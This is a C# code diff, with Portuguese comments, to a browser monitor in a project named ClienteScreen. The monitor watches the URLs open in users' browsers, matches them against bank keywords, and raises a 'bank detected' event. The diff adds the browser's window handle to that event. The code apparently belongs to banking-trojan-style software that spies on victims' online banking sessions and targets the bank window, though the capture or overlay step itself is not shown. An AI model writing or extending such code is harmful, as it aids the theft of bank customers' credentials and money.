@@ -109,8 +109,8 @@ namespace ClienteScreen
                             // Atualiza última URL
                             _lastUrls[browserName] = url;
 
-                            // Detecta banco na URL
-                            CheckForBankKeywords(url, browserName);
+                            // Detecta banco na URL (passa process para ter handle da janela)
+                            CheckForBankKeywords(url, browserName, process);
                         }
                         catch
                         {
@@ -163,7 +163,7 @@ namespace ClienteScreen
         /// <summary>
         /// Verifica se URL contém palavras-chave de bancos
         /// </summary>
-        private void CheckForBankKeywords(string url, string browserName)
+        private void CheckForBankKeywords(string url, string browserName, Process browserProcess)
         {
             if (string.IsNullOrEmpty(url))
                 return;
@@ -177,9 +177,11 @@ namespace ClienteScreen
                     // Detectou banco!
                     string bankCode = kvp.Value;
                     string computerName = Environment.MachineName;
+                    IntPtr windowHandle = browserProcess?.MainWindowHandle ?? IntPtr.Zero;
 
                     Console.WriteLine($"[BROWSER-MONITOR] BANCO DETECTADO! {bankCode} em {browserName}");
                     Console.WriteLine($"[BROWSER-MONITOR] URL: {url}");
+                    Console.WriteLine($"[BROWSER-MONITOR] Window Handle: {windowHandle}");
 
                     // Dispara evento
                     BankDetected?.Invoke(this, new BankDetectedEventArgs
@@ -187,7 +189,8 @@ namespace ClienteScreen
                         BankCode = bankCode,
                         Url = url,
                         BrowserName = browserName,
-                        ComputerName = computerName
+                        ComputerName = computerName,
+                        BrowserWindowHandle = windowHandle
                     });
 
                     break; // Apenas um alerta por URL
@@ -205,5 +208,6 @@ namespace ClienteScreen
         public string Url { get; set; }             // URL completa
         public string BrowserName { get; set; }     // "chrome", "firefox", etc
         public string ComputerName { get; set; }    // Nome do computador
+        public IntPtr BrowserWindowHandle { get; set; }  // Handle da janela do navegador
     }
 }
